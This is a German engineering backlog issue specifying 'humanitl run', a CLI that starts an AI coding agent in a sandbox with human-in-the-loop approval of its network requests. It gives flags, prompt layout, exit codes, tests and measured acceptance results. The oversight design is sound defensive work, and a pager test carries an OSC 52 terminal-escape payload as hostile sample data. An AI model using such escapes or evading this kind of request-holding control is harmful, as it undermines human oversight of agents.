- `codes.rs` und die ARBs sind geteilte Dateien (CLAUDE.md): neu lesen, anhängen; die Strukturänderung an `CodeInfo` vorher anmelden.
- Titel und `why` stehen heute in verschiedenen Sprachen; dieses Issue macht daraus nichts Schlimmeres und nichts Besseres.

### Referenzen
BACKLOG.md ADR-012, Abschnitt 1.3 Prinzip 7; CONVENTIONS.md 3.2, 3.8, 3.12, 4.6, 4.11, 4.13; `docs/UX.md` Regel 6, 3.3; `docs/DIAGNOSTICS.md`; HUM-041, HUM-043, HUM-044, HUM-045, HUM-069, HUM-106.

---

## HUM-067 · `humanitl run`
Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-064, HUM-066, HUM-037, HUM-039, HUM-018, HUM-104 (gebaut, 2026-09-04), HUM-041 (Check-Ereignisse aus `Sandbox(Start)`), HUM-042 (PTY, Filter, `Terminal`-Handler); nur für die Summary-Zeile HUM-043, nur für den systemd-Zweig HUM-070 · Blockiert: HUM-046

### Kontext
ADR-013: Die CLI ist erstklassig. `humanitl run` im Projektverzeichnis startet den Agenten isoliert, ohne dass das UI läuft. `--profile llm-only` liefert die reine Inferenz-Instanz: nur der LLM-Server ist erreichbar, alles andere wird ohne Nachfrage geblockt. Mit `--ask terminal` moderiert der Nutzer im selben Terminal (Muster pipelock) — für zeilenorientierte Kommandos; für Vollbild-TUI-Agenten wie OpenCode verweigert die CLI das mit `CLI_002` (CONVENTIONS 4.10). Ein später gestartetes UI hängt sich an dieselbe Session.

### Ziel
`humanitl run` verbindet sich mit dem Daemon, löst das Sitzungsprofil auf (streng, `Context::config`, CONVENTIONS 4.23), startet eine Session mit `work_dir = cwd`, reicht das PTY des Nutzers durch (Raw-Mode, Resize-Weiterleitung), zeigt gehaltene Requests je nach `--ask` als Terminal-Prompt oder blockt sie, und beendet sich mit dem Exit-Code des Agenten. `Ctrl+C` geht an den Agenten; `Ctrl+]` (wie telnet) öffnet ein kleines Humanitl-Menü (Stop, Queue). **Der eigentliche Rumpf des Issues, den die erste Fassung nicht nannte:** der Daemon bekommt eine Konfiguration je Sitzung. Heute löst `humanitld` seine `Config` genau einmal beim Start auf (`load_config` mit `discover_with(xdg.env(), &cwd, None)`) und friert Regelspeicher, Haltefrist, Durchreichregel, `SessionId` und `SandboxService::new(config.clone(), …)` darum ein; `--profile`, `--ask`, `--llm` und `-- CMD` haben ohne diesen Umbau keinen Weg in den Daemon.

### Nicht-Ziel
Kein eigener Proxy in der CLI (alles läuft im Daemon). Kein Daemon-loser Modus. Kein Multi-Session-Management (nur eine Session pro cwd gleichzeitig). Kein `--ro` (zweiter Weg zu `sandbox.work_mode`; `--work-mode ro` gibt es, und `cli.rs` verbietet zwei Wege zu einem Feld). `--detach` und `attach` sind aus diesem Issue herausgenommen: `attach` braucht eine Sitzungsliste, die kein RPC liefert, und beides fehlt in CONVENTIONS 3.8; wer es baut, ergänzt 3.8 im selben Commit. Kein `SessionSummary` (HUM-043).

### Betroffene Pfade
- `proto/humanitl/v1/humanitl.proto`: `SandboxRequest.Start` bekommt `session_profile`, `ask_mode` und `repeated CliOverride { string path; string value }`; `profile` bleibt das bwrap-Profil, das `ipc/src/sandbox.rs::profile_path` unter `profiles/sandbox/` sucht (`profiles/sandbox/llm-only.toml` gibt es nicht; `profiles/llm-only.toml` ist ein Sitzungsprofil). `scripts/gen-proto.sh`, `proto/generated.sha256`, `proto/descriptor.binpb`.
- `daemon/bin/humanitld/src/main.rs`, `daemon/crates/ipc/src/sandbox.rs`: `SandboxService` nimmt den Resolver statt einer eingefrorenen `Config`; `start` löst `Resolved` aus Profil plus Overrides auf und baut Regelspeicher, Haltefrist und Durchreiche für diese Sitzung neu
- `daemon/bin/humanitld/src/main.rs` (`load_rules`): `Profile::rules_document()` mit `humanitl_rules::parse_rules` und `Profile::rule_files()` einlesen, Rang 4 (CONVENTIONS 4.5); heute hat `rules_document()` außerhalb von Tests keinen Leser, und HUM-104 hat die Verdrahtung ausdrücklich hierher gelegt
- `daemon/crates/ipc/src/server.rs` (`subscribe`, `sandbox`, `terminal`) — es gibt keine `daemon/crates/ipc/src/service.rs`
- `daemon/bin/humanitl/src/cmd/run.rs` (vorhanden: `ctx.config()` und `session_lines` aus HUM-066, endet mit `not_yet_failure("humanitl run", "HUM-067")`)
- `daemon/bin/humanitl/src/tty.rs` (neu): Raw-Mode, Resize, Restore
- `daemon/bin/humanitl/src/ask_terminal.rs` (neu): Prompt-Renderer
- `daemon/crates/core-types/src/diagnostics/codes.rs`: ein `CLI_00n` für die zweite Sitzung im selben Ordner (kein Bereich `SESSION`, kein Bereich `PROJECT` in `AREAS`)
- Nur wenn `--ask none` auf `403` wechselt (Entscheidung, siehe Spezifikation): `daemon/crates/core-types/src/flow.rs` (`BlockReason::AskModeNone`), Proto `BLOCK_REASON_ASK_MODE_NONE`, CONVENTIONS 3.2 (Statuskommentar), Dart-Spiegel, **und** `agents/opencode/briefing.en.md`, `briefing.de.md`, `daemon/crates/sandbox/src/agent/briefing.rs` (Test `ask_mode_none_replaces_the_sentence_about_waiting` hält heute `504` fest)
- `docs/cli.md` (neu)

### Spezifikation

Syntax (CONVENTIONS.md 3.8, unverändert):

```
humanitl run [--profile NAME] [--work DIR] [--work-mode ro|rw] [--ask ui|terminal|none] [--llm URL] [-- CMD...]
```

`--work`, `--work-mode`, `--ask`, `--llm` entstehen schon aus dem Schema (`SHORT_FLAGS` in `cli.rs`), `RunArgs` nimmt das nachgestellte `-- CMD`; `--profile` ist global und bedeutet unter `humanitl run` das Sitzungsprofil (CONVENTIONS 4.23, Nachtrag).

Semantik:
- `--work` Default cwd. Muss existieren und benutzbar sein; heute prüft `check_work_dir` (`profile.rs`) die Mount-Politik und antwortet `SANDBOX_006`, und `ipc/src/sandbox.rs` prüft absolut, ohne `..`, unter `$HOME` oder gleich `sandbox.work_dir` (CONVENTIONS 4.17). Es gibt kein `PROJECT_002`.
- `--ask` Default aus Profil (`hold.ask_mode`). `ui`: Requests bleiben in der Queue, die CLI zeigt nur `[humanitl] request held: …` als Zeile, das UI entscheidet (oder Timeout). `terminal`: Prompt im Terminal (unten); verweigert, wenn `AgentAdapter::is_fullscreen_tui()` gilt (OpenCode: `true`, Vorgabe-Adapter `opencode`), mit `CLI_002` und dem Vorschlag `--ask ui` oder `--ask none`. **Wie die `ask_terminal_*`-Tests dann laufen, ist zu entscheiden:** entweder hängt die Verweigerung am wirksamen Kommando, wenn `-- CMD` gegeben ist, oder die Tests setzen `agent.adapter` auf einen Nicht-TUI-Adapter. `none`: siehe unten.
- `--llm` überschreibt `llm.endpoint` (Origin `Cli`); wirkt nur mit der Konfiguration je Sitzung.
- `-- CMD...` überschreibt `agent.command` für diese Session (z. B. `-- bash`, um in der Sandbox zu arbeiten); reist als `Start.command`, das es schon gibt.

Ablauf:

1. Daemon verbinden (UDS). Fehlschlag ⇒ `DAEMON_001`, Exit 2 (`client::channel` liefert den Befund). Der Zweig `systemctl --user start humanitld.socket` bleibt als Wächter stehen, feuert aber nie, bevor HUM-070 eine Unit liefert: `packaging/systemd/` hält nur `.gitkeep`, `DaemonCmd` hat nur `Status`, `LISTEN_FDS` liest niemand.
2. `GetInfo`, Versionscheck (`DAEMON_002`, Exit 1) — vorhanden in `cmd/daemon.rs`, wiederverwenden.
3. Sitzungsprofil auflösen: `ctx.config()` als **erster** Aufruf (CONVENTIONS 4.23; das ist der `CONFIG_003`-Riegel gegen ein feindliches Projekt-Profil), dann `ProfileSelection` plus CLI-Overrides an den Daemon, der für die Sitzung erneut auflöst.
4. Terminalgröße lesen (`ioctl TIOCGWINSZ`), Raw-Mode setzen (`termios`: `cfmakeraw`, `ISIG` bleibt aus, damit Ctrl+C als Byte an den Agenten geht), Restore bei jedem Exit-Pfad (inklusive Panic-Hook und `SIGTERM`).
5. `Sandbox(Start { profile: <bwrap>, session_profile, work_dir, work_mode, ask_mode, cli_overrides, command })`. Events streamen: drei `SandboxEvent.check` (`CheckResult`, HUM-041; ein Typ `IsolationResult` existiert nicht) werden als drei Zeilen gedruckt (`✔ no network interface`, …), Fehlschlag ⇒ Diagnostic-Block, Exit 3.
6. `Terminal`-Bidi-Stream öffnen: zuerst `Open { sandbox_id, cols, rows, read_only: false }` (HUM-042). stdin ⇒ `data`, `data` ⇒ stdout. `SIGWINCH` ⇒ `Resize`.
7. Parallel `Subscribe` für `--ask terminal|ui`; `SubscribeRequest` hat `since_flow_id` und `include_passthrough`, kein `held_only` — der Client filtert auf `FlowEvent.Held`. Wer `held_only` will, fügt `bool held_only = 3` hinzu und verdrahtet es in `subscribe`; client-seitig ist billiger.
8. Bei `Exit { code }`: Terminal restore, Exit mit `code` (Signal ⇒ 128+n, `exit_code_of` in `cmd/sandbox.rs`). Die Summary-Kurzzeile („3 files changed, …") kommt erst mit HUM-043.

`Ctrl+]` (0x1D) wird von der CLI abgefangen (nicht ans PTY geschickt) und zeigt eine Zeile `[humanitl] (s)top (q)ueue (Esc) back`. `q` listet gehaltene Flows mit Nummer, `a<n>`/`b<n>` entscheiden. Das ist der Notausgang, wenn `--ask ui` läuft und kein UI da ist.

Prompt-Format `--ask terminal` (wird auf stderr geschrieben, während stdout weiter den Agenten zeigt; zur Vermeidung von Zeilensalat wird die Agent-Ausgabe für die Dauer des Prompts gepuffert, max. 256 KiB, dann durchgeleitet — **durch denselben OSC-Filter, den HUM-042 im Daemon baut**, und der Prompt wird nach jedem Durchleiten neu gezeichnet):

```
┌─ humanitl · request held (1 of 2) ─────────────────────────────── 04:52 left ─┐
│ POST https://api.github.com/graphql                                            │
│ from: opencode · webfetch                                                      │
│ size: 2.1 KB · json                                                            │
│ findings: 1 · GITHUB_TOKEN in header Authorization                             │
│ catalog: GitHub API · source hosting · Rang #37                              │
│                                                                                │
│ [a] allow once   [s] allow this session   [b] block   [r] rule…   [e] edit…   │
│ [v] view body    [n] next                                                      │
└────────────────────────────────────────────────────────────────────────────────┘
```

Jedes Feld läuft durch `humanitl_core::block::sanitize_note` und wird auf Anzeigebreite geklemmt. Tasten: `a` Allow einmal; `s` Allow + Regel `expires: session` mit Ziel Host (über `Decide.remember`, nie lokal ausgewertet); `b` Block; `r` öffnet Zwei-Schritt-Auswahl (Ziel: `1` exact URL, `2` host, `3` apex `**.`, `4` host+method; Dauer: `1` once, `2` session, `3` forever) und zeigt den Regelsatz vor Bestätigung mit `Enter`; `e` schreibt Request als Datei nach `$XDG_RUNTIME_DIR/humanitl/edit-<id>.http` (0600, nie in `/work` oder cwd, auf jedem Ausgang gelöscht), öffnet `$EDITOR`, nach Schließen wird die Datei geparst und als `AllowEdited` gesendet (Parse-Fehler oder `IPC_004` ⇒ zurück zum Prompt mit Fehlerzeile); `v` zeigt die ersten 4 KiB des Bodys mit eingebautem Pager, der nicht druckbare Bytes hex-rendert — `GetBody` liefert Rohbytes, und der Filter aus HUM-042 sitzt am PTY-Strom, nicht an `GetBody`; `n` nächster gehaltener Request ohne Entscheidung. Countdown oben rechts aktualisiert sekündlich. Timeout ⇒ Zeile `[humanitl] timed out → blocked` und Prompt für den nächsten. `Ctrl+C` im Prompt ⇒ Prompt schließen (Request bleibt gehalten), zurück zum Agenten.

`--ask none` im Daemon — **zu entscheiden, hier steht der Ist-Zustand:** heute setzt `main.rs` `AskMode::None => Duration::ZERO`, die Warteschlange nimmt den Fluss mit abgelaufener Frist an, `Ticket::wait` endet `TimedOut`, `handler.rs` verbucht `BlockReason::Timeout`, HTTP `504`, `DECISION_KIND_TIMED_OUT`; `model.rs` dokumentiert es so, und das Agenten-Briefing (HUM-071, gemerged) sagt dem Agenten wörtlich `504` mit Test in `briefing.rs`. `profiles/llm-only.toml` behauptet im Kommentar „sofort geblockt". Entweder bleibt `504` (kostet nichts, ist wahr, der Profil-Kommentar wird korrigiert), oder es wird `403` mit `BlockReason::AskModeNone` — dann samt Proto, CONVENTIONS 3.2, Dart, beiden Briefing-Dateien und dem Test im selben Commit, sonst erzählt genau die Version, die es ändert, dem Agenten den falschen Status.

Exit-Codes: Agent-Exit-Code durchgereicht; 2 Daemon nicht erreichbar; 3 Isolation-Check fehlgeschlagen; 1 Nutzerfehler (Profil, Pfad); 4 ist `EXIT_SECURITY` (`cmd/mod.rs`, `--help`, CONVENTIONS 3.8) und nicht „nur für Tests". Bekannte Kollision: ein Agent, der selbst mit 2 oder 3 endet, ist von einem Daemon- oder Isolationsfehler nicht zu unterscheiden; `docs/cli.md` sagt das.

Signal-Handling: `SIGINT` im Raw-Mode kommt als Byte 0x03 und geht an den Agenten; `SIGTERM` an die CLI ⇒ `Sandbox(Stop)`, Restore, Exit 143; `SIGHUP` (Terminal geschlossen) ⇒ Session läuft weiter, Meldung ins Daemon-Log.

Attach durch UI: Das UI zeigt die laufende Sitzung im Sandbox-Screen (heute genau eine je Daemon, `SandboxService`) und öffnet den `Terminal`-Stream mit dem **vorhandenen** `TerminalInput.Open.read_only = true` — kein neues Feld, kein `detach`. Ein Schreiber (die CLI), beliebig viele Leser (CONVENTIONS 4.10, HUM-042). Hold-Entscheidungen kann jeder Client treffen; die erste gewinnt, die zweite erhält `IPC_003`.

### Schritte
1. Drei Entscheidungen im Text festhalten, bevor Code entsteht: (a) Konfiguration je Sitzung im Daemon oder HUM-067 schrumpft auf das, was ohne sie geht; (b) `--ask none` bleibt `504` oder wird `403`; (c) wie `run --ask terminal` OpenCode mit `CLI_002` verweigert und womit die drei `ask_terminal_*`-Tests dann laufen.
2. Proto: `session_profile`, `ask_mode`, `cli_override` an `Start`; Codegen.
3. `SandboxService` sitzungsbezogen; `load_rules` liest Profilregeln (Rang 4); Test: `--profile llm-only` blockt `example.com` per Regel, die Durchreiche erreicht das Modell weiterhin (HUM-104 hält Rang 1 mit einem Test am Ladeweg).
4. Ask-Modus nach (b), mit allen genannten Dateien.
5. `CLI_00n` für die zweite Sitzung im selben Ordner registrieren; Fallstrick unten.
6. HUM-041 und HUM-042 landen (drei `SandboxEvent.check`, PTY, Filter, Handler mit `read_only`). Ohne beide ist HUM-067 nicht fertig.
7. `tty.rs`: Raw-Mode-Guard mit `Drop`, Panic-Hook, `SIGTERM`/`SIGHUP`-Handler, `TIOCGWINSZ`/`SIGWINCH`, `cfmakeraw` mit `ISIG` aus. Die termios- und Signal-Abhängigkeiten stehen nicht in `daemon/Cargo.toml` (`libc` 0.2 ja; `nix`, `signal-hook`, `expectrl` nein); der Elternagent trägt ein, was nötig ist.
8. `run.rs` umschreiben: `ctx.config()` zuerst, `ctx.connect()`, `DAEMON_002` aus `cmd/daemon.rs`, `Sandbox(Start …)`, drei Check-Zeilen, Exit 3, `Terminal`-Bridge, `exit_code_of`. Vorbild ist `cmd/sandbox.rs` (`start`, `enforce_isolation`, `wait_or_interrupt`, `finish`) — mit dem Unterschied, dass bwrap nicht mehr im CLI-Prozess startet.
9. `ask_terminal.rs`, `Ctrl+]`-Menü, `docs/cli.md`.
10. Integrationstests gegen echten Daemon mit `-- sh`.

### Tests
- `run_sh_echo_exit_code`: `humanitl run --profile llm-only -- sh -c 'echo hi; exit 7'` ⇒ stdout enthält `hi`, Exit 7, Check-Zeilen erscheinen zuerst.
- `run_llm_only_blocks_curl`: `-- sh -c 'curl -sS -o /dev/null -w "%{http_code}" https://example.com'` ⇒ `403`, Flow `Decided(Block { reason: Rule(<Id der Blockregel aus llm-only>) })`, kein Held. Nicht `AskModeNone`: die Profilregel `block host "**"` entscheidet vorher.
- `run_default_ask_none_status`: Profil `default`, `--ask none`, Host ohne Regel ⇒ der Status aus Entscheidung (b).
- `run_llm_only_allows_llm`: Fake-LLM unter `--llm` ⇒ `curl … /v1/models` ⇒ `200`.
- `ask_terminal_prompt_allow`, `ask_terminal_rule_session`, `ask_terminal_timeout_blocks`: mit dem Aufruf aus Entscheidung (c); PTY-Treiber wie vom Elternagenten freigegeben.
- `ask_terminal_refuses_tui_agent`: Vorgabe-Adapter ⇒ `CLI_002`.
- `raw_mode_restored_on_panic` (Unit mit simuliertem Panic).
- `sigterm_stops_session_exit_143`.
- `attach_read_only_sees_output`, `reader_cannot_write`.
- `pager_renders_control_bytes_inert`: Body mit `\x1b]52;…\x07` ⇒ hex, kein ESC im Terminal.

### Akzeptanzkriterien
- [x] `cd ~/projekt && humanitl run --profile llm-only` startet OpenCode, der Prompt erscheint, `webfetch` liefert dem Agenten `403` aus der Profilregel, Inferenz funktioniert (Durchreiche Rang 1). **Alle vier Teile sind mit dem echten Agenten gemessen, der vierte am 2026-09-11 mit HUM-141.** *`webfetch` im echten Agenten:* Schritt 13 des M3-Laufs gibt OpenCode kopflos die Frage `humanitl-webfetch https://humanitl-probe.example/page`, unter einem Profil, das aus `llm-only` abgeleitet ist und nur `OPENCODE_PERMISSION` auf `{"webfetch":"allow"}` stellt -- sonst verweigerte OpenCode das Werkzeug ohne Menschen, und gemessen wäre die Berechtigung des Agenten statt der Regel von Humanitl. Das Mock-Modell antwortet mit einem Aufruf von `webfetch`, die Regel des Profils blockt die Anfrage (`decision = block`, `rule_id` gesetzt, genau ein Eintrag im Verlauf), und im Transkript des Agenten steht `✗ WebFetch https://humanitl-probe.example/page failed` mit `Error: StatusCode: non 2xx status code (403 GET https://humanitl-probe.example/page)`. Getippt wird dabei nicht; das Tippen ins TUI liegt als HUM-152. Der Lauf steht bei `M3 demo: OK` mit 133 Zusicherungen, davon 22 im OpenCode-Zweig. Was folgt, ist der Stand vom 2026-09-07. *Start und Bild:* Schritt 13 des M3-Laufs fährt das echte OpenCode-TUI unter `--profile llm-only` an einem Pseudoterminal; im Transkript stehen „Ask anything…" und „Humanitl local LLM" (zwei eigene Zusicherungen), dazu die drei Garantien einzeln, kein Griff nach `models.dev`, nach `models.opencode.ai` oder nach GitHub, und nichts, was auf einen Menschen wartet. Damit das Profil und die Sandbox zusammenpassen, legt der Lauf eine eigene Fassung von `profiles/llm-only.toml` an: Die mitgelieferte setzt `[config.sandbox] profile = "default"`, und OpenCode liegt hier unter `$HOME` statt unter `/usr/local/bin` -- genau das tut auch ein Mensch, dessen Agent woanders liegt. *Inferenz:* Schritt 13 fährt den echten Agenten **zweimal** unter `--profile llm-only`, und der Grund steht im Skript: kopflos (`opencode run …`) fragt er das Modell von selbst, im TUI wartet er auf einen Menschen. Der kopflose Lauf trägt die beiden Zusicherungen über den Verkehr (der Agent hat das Modell angesprochen, und mindestens eine Inferenzanfrage war darunter), der TUI-Lauf das Bild; eine dritte Zusicherung liest die Zeile `profiles: … llm-only` aus dem Kopf des Laufs, weil sonst auch ein Lauf ohne dieses Profil grün bliebe. *`403` aus der Regel:* Schritt 12, dasselbe Profil, mit einem Agenten, der wirklich fragt -- zehn Rahmen aus der Durchreiche, `403` für alles Übrige, und eine eigene Zusicherung dafür, dass die **Regel** entschieden hat und nicht eine abgelaufene Frist. *Was fehlt:* derselbe `403` auf dem Weg durch den echten Agenten, also `webfetch` in OpenCode statt `curl` in einem Skript. Dafür müsste OpenCode `webfetch` aufrufen, und dazu bräuchte es ein Modell, das einen Werkzeugaufruf liefert; das Mock-Modell dieses Laufs sagt auf jede Frage `tok0 … tok9`. Aufgeschrieben als HUM-141, samt der zweiten Messung des Tages: Tippen in ein laufendes TUI geht über `humanitl sandbox attach` (gemessen mit `/bin/sh`: `echo HELLO-FROM-PIPE` kommt an), nicht über `humanitl run`, das ausdrücklich keine Taste weiterreicht. Der ganze Lauf steht bei `M3 demo: OK` mit 126 Zusicherungen, davon 15 im OpenCode-Zweig. Und ein Fund aus demselben Lauf, der nicht in dieses Issue gehört, aber hier steht, weil er ohne den Lauf niemandem aufgefallen wäre: Ein Vollbild-TUI fängt `SIGTERM` selbst ab, und der Daemon wartet danach ohne Frist auf sein Kind -- der Lauf räumt das seitdem selbst weg (`m3_end_sandbox_from`), und der eigentliche Fehler liegt als HUM-142.
- [x] `humanitl run --ask terminal -- <zeilenorientiertes Kommando>` zeigt den Prompt exakt im Format oben, `a`/`b`/`s`/`r`/`e`/`v`/`n` funktionieren; mit dem OpenCode-Adapter antwortet `run --ask terminal` mit `CLI_002`. **Gebaut und gemessen am 2026-09-06, mit einer benannten Lücke am Ende.** Der Kasten steht in `daemon/bin/humanitl/src/ask_terminal.rs`, die Verbindung zum Daemon in `daemon/bin/humanitl/src/cmd/moderate.rs`, der Rohmodus samt Rückgabe in `daemon/bin/humanitl/src/tty.rs`. Gemessen: `every_line_is_exactly_the_width_of_the_window` (jede Zeile genau so breit wie das Fenster, vier Breiten), `a_long_request_is_clamped_instead_of_pushing_the_edge`, `an_escape_from_the_agent_never_reaches_the_terminal` (kein `ESC`, kein Wagenrücklauf, keine Glocke), `the_countdown_reads_like_a_clock`, `every_key_of_the_specification_has_its_choice` (alle sieben Tasten plus `Esc` und `Ctrl+C`), `a_second_hold_waits_instead_of_taking_the_screen`, `a_decision_elsewhere_closes_the_box_and_opens_the_next`, `next_moves_on_without_deciding`, `a_key_decides_the_flow_that_stands_in_the_box`, `a_key_without_a_box_decides_nothing`, `escape_closes_the_box_and_leaves_the_request_held`, `a_box_holds_the_output_until_the_cap` (256 KiB), `every_target_builds_what_its_line_promises` (die vier Ziele und die drei Dauern von `r`), `a_request_survives_the_way_through_the_editor` und `an_unreadable_file_is_refused_instead_of_guessed` (`e`), `the_body_shows_text_as_text_and_bytes_as_hex` und `an_escape_in_the_body_never_leaves_as_an_escape` (`v`), `a_double_width_character_never_reaches_the_box` (der Kasten rechnet in ASCII-Spalten, sonst wäre eine Zeile in Zeichen richtig und auf dem Schirm zu breit), `a_foreign_decision_keeps_the_position_true` (eine Entscheidung im Fenster lässt den Kopf nicht „(2 of 1)“ sagen), `ctrl_c_without_a_box_ends_the_session` (im Rohmodus ist `ISIG` aus, also kommt `Ctrl+C` als Byte und muss die Sitzung selbst beenden) und `host_and_path_come_from_the_structure` (eine Regel entsteht aus dem, was der Dienst schickt, nicht aus der gezeichneten Zeile: `[::1]:8080` zerfiele sonst in `[`, und eine Abfrage im Pfad landete in einer Regel, die nie trifft). Die Verweigerung: `ask_terminal_is_cli_002_and_names_both_ways_out` und `run_with_ask_terminal_is_cli_002_before_it_connects` für OpenCode, `a_command_of_its_own_is_not_the_fullscreen_agent` für den Gegenfall — entschieden wird am wirksamen Kommando, nicht am Namen des Adapters —, `without_a_terminal_ask_terminal_is_cli_002` und `run_ask_terminal_without_a_terminal_is_cli_002` für die Eingabe ohne Terminal, und `a_target_that_would_widen_the_rule_is_refused` für die drei Ziele, aus denen keine ehrliche Regel entsteht. `an_event_that_is_not_about_the_box_leaves_it_standing` hält fest, dass ein Ereignis, das den Kasten nicht angeht, ihn stehen lässt — der Strom trägt jede Antwort und jedes Stück einer Antwort —, `a_resync_takes_the_queue_of_the_daemon` den Weg nach verworfenen Ereignissen (der Rundfunk hat einen Puffer, und dieser Befehl liest ihn nicht, solange er auf einen Editor wartet; was fällt, kann eine gehaltene Anfrage sein), und fünf Tests um den Editor, dass die Anfrage unverändert durch ihn geht: `a_body_keeps_its_bytes_through_the_editor` (`multipart/form-data` trägt `\r\n` um jede Grenze), `a_file_with_crlf_line_endings_keeps_its_body`, `a_file_with_only_a_request_line_has_no_body`, `a_request_without_headers_keeps_its_body`, `a_request_without_a_body_stays_without_one` und `a_last_header_without_a_newline_survives` (ein Editor ohne letzten Umbruch ist der Normalfall, und eine Kopfzeile, die dabei verschwände, wäre eine Anfrage, die der Mensch nicht geschrieben hat). **Die Lücke:** Ein Lauf mit echtem Daemon, echtem gehaltenem Fluss und einem Menschen an der Tastatur ist hier nicht gemessen; er braucht den Aufbau von `tests/e2e` und gehört nach dem Stand-Abschnitt dieses Issues in das M3-Demoskript (HUM-046).
- [x] Terminal ist nach jedem Exit-Pfad (normal, Ctrl+], SIGTERM, Panic) wieder im Normalmodus (`stty -a` zeigt `icanon echo`). **Gemessen am 2026-09-07, mit zwei benannten Ausnahmen — und die Messung hat einen Fehler gefunden, den es vorher gab.** Die Vorrichtung ist `daemon/bin/humanitl/tests/tty.rs`: ein Pseudoterminal um `humanitl sandbox attach`, dessen Einstellungen von außen gelesen werden. `every_signal_gives_the_terminal_back` fährt `SIGTERM`, `SIGHUP` und `SIGINT`, prüft je Exit `143`, `129`, `130` und dass `ICANON` und `ECHO` danach wieder gesetzt sind; `the_ordinary_end_is_an_exit_and_not_a_wait` schließt die Gegenseite des Terminals und prüft Exit 0. **Der Fehler:** Bis dahin endete der Befehl nach einem Signal überhaupt nicht. Er gab das Terminal zurück und blieb dann stehen — `#[tokio::main]` wartet beim Fallenlassen der Laufzeit auf blockierende Aufgaben, und der Tastenleser (`tokio::io::stdin`) ist genau eine; sie kehrt erst zurück, wenn jemand tippt, und nach `SIGTERM` tippt niemand mehr. `main` baut die Laufzeit jetzt selbst und lässt sie mit `shutdown_background()` fallen, wenn alles Getane getan ist. Mutationsprobe: `drop(runtime)` statt dessen, Test rot (30 s Frist). `the_end_of_the_session_gives_the_terminal_back` misst den Weg, den ein Mensch am häufigsten geht — der Agent endet, der Dienst schickt `Exit` —, und dort steht das Terminal noch, also wird auch gefragt, wie es danach dasteht; der Fake beendet seine Sitzung dafür beim Byte `0x04`. Die Panik hat ihren eigenen Test im Quelltext: `a_panic_gives_the_terminal_back` (`daemon/bin/humanitl/src/tty.rs`) legt ein eigenes Pseudoterminal an, setzt den Rohmodus darauf, lässt eine Panik laufen und prüft, dass der Hook zurückgibt; Mutationsprobe: `restore()` aus dem Hook entfernen, Test rot. Dafür trägt `RawMode` jetzt den Deskriptor, den er zurückgeben muss, statt fest `0` anzunehmen. **Was offen bleibt und wo es hingehört:** Das Ende der Eingabe (die andere Seite des Terminals geht zu) sagt nichts über das Terminal, weil es danach keines mehr gibt — `tcgetattr` antwortet `EIO`, gemessen; der Fall misst deshalb nur, dass der Befehl mit 0 endet, statt zu warten. Und der eigene Weg von `humanitl run` — erst die Sitzung stoppen, dann das Terminal zurückgeben — ist hier nicht gemessen: Gegen den Fake endet ein `run` sofort (Exit 1, `CLI_001`), bevor überhaupt ein Rohmodus entsteht; das braucht einen echten Daemon und gehört ins M3-Demoskript (HUM-046). Ein `Ctrl+]`-Menü gibt es nicht; `docs/cli.md` sagt das. **Nebenbefund, im selben Commit behoben:** `humanitl run --ask terminal` schrieb vor dem ersten Byte des Agenten die Zeile „`--ask terminal is not available yet`" — ein Rest aus der Zeit vor diesem Issue, den derselbe Lauf im nächsten Moment widerlegte, indem er die Frage stellte.
- [x] UI zeigt die CLI-Session, beobachtet sie read-only über `Open.read_only` und kann Hold-Entscheidungen treffen. **Gemessen am 2026-09-06.** Bis dahin hängte sich das Fenster immer als Schreiber an: Lief `humanitl run`, bekam es `TERM_001` und zeigte einen toten Streifen — dabei ist genau das der Normalfall, für den dieses Kriterium steht. Jetzt fällt es auf `Open.read_only` zurück, sobald der Daemon den Schreibplatz vergeben hat, und an die Stelle des Befund-Streifens tritt ein Satz im ruhigen Chrome: „Ein anderer Client tippt in dieser Sitzung. Dieses Fenster sieht zu." Kein Zustand einer Anfrage, also keine Zustandsfarbe (`docs/UX.md` 5 und 6). `a_window_next_to_a_writing_command_line_watches_read_only` (`app/test/features/sandbox/terminal_pane_test.dart`) belegt das gegen einen Fake, dessen Schreibplatz vorher vergeben wurde: Phase `attached`, `readOnly` wahr, `TERM_001` im Zustand, und die Ausgabe des Agenten steht im Puffer. Mutationsprobe: den Rückfall entfernen, Test rot. Derselbe Test misst drei weitere Zusagen dieser Lage: Der Streifen ist der erklärende und nicht der des Befunds (`bg2`, weder `state.error` noch `state.held`); endet der Agent, während das Fenster zusieht, kommt der Befund **nicht** zurück (`TERM_001` bleibt im Zustand stehen, gehört aber einer Lage, die vorbei ist — orange neben der Exit-Zeile wäre eine Meldung über etwas, das gerade gutgegangen ist); und „Einfügen“ ist aus — `Terminal.paste` ruft `onOutput` auch in einer nur lesenden Ansicht, die Bytes gingen hinauf, und der Daemon verwürfe sie. Die Tastatur bleibt aus (`the_emulator_takes_no_keys_when_the_daemon_would_drop_them`). **Nicht gemessen, sondern gebaut:** Dass Hold-Entscheidungen weiterlaufen, folgt aus der Trennung — sie gehen über die Warteschlange und einen eigenen RPC, nicht über dieses Terminal —, und dieser Test fährt sie nicht.
- [x] `docs/cli.md` beschreibt alle Flags, Tasten und Exit-Codes, wie sie sind. (Am 2026-09-12 nachgezählt und dabei eine Lücke gefunden und geschlossen: Die drei globalen Schalter `--config`, `-v`/`--verbose` und `-q`/`--quiet` stehen mit `global = true` in `GlobalOpts` (`daemon/bin/humanitl/src/cli.rs`), gelten damit auch für `humanitl run`, werden in `main.rs` gelesen — und kamen im Dokument null mal vor. Der Abschnitt „Die globalen Schalter" in `docs/cli.md` führt sie jetzt samt `--json` und `--profile` mit ihrer Wirkung auf `Renderer::note` und `Renderer::detail`. Tasten und Exit-Codes stimmten schon vorher: Die Tabelle deckt sich mit `EXIT_CODES_HELP`, samt 10 und 11 für `rules test`. Kein Werkzeug vergleicht das Dokument mit `clap`; ein Test `docs_cli_names_every_global_flag` wäre die Absicherung und fehlt.)

### Stand (2026-09-04): Größe XL, der Daemon kennt keine Sitzungskonfiguration, vier genannte Dinge gibt es nicht

